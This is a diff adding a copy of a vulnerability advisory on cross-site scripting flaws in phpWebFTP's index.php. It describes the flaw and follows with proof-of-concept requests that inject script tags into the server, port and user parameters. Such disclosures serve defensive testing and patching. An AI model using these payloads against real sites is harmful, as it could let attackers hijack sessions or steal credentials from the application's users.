@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/17688/info
+
+phpWebFTP is prone to multiple cross-site scripting vulnerabilities. These issues are due to the application's failure to properly sanitize user-supplied input using the HTTP 'POST' method when submitting a malicious URI. 
+
+An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+http://www.anysite.com/PhpWebFtp/index.php?server=1&port=<script>var%20sub_variable=11233;alert(sub_variable);</script>&goPassive=on&user=1&password=1&language=bulgarian server=<script>alert(&#039;&#039;as-208395078&#039;);</script>&port=21&goPassive=on&user=1&password=1&language=bulgarian 
+server=1&port=21&goPassive=on&user=<script>alert(&#039;as-453627&#039;);</script>&password=1&language=bulgarian
+server=><script>alert(&#039;as-208395078&#039;);</script>&port=21&goPassive=on&user=1&password=1&language=bulgarian
+server=1&port=21&goPassive=on&user=&#039;><script>alert(&#039;as-208395078&#039;);</script>&password=1&language=bulgarian
+server=&lt;/textarea&gt;<script>alert(&#039;2134327801&#039;);</script>&port=21&goPassive=on&user=1&password=1&language=bulgarian
+server=1&port=21&goPassive=on&user=<script>var%20test_variable=878173184;
+alert(test_variable);</script>&password=1&language=bulgarian
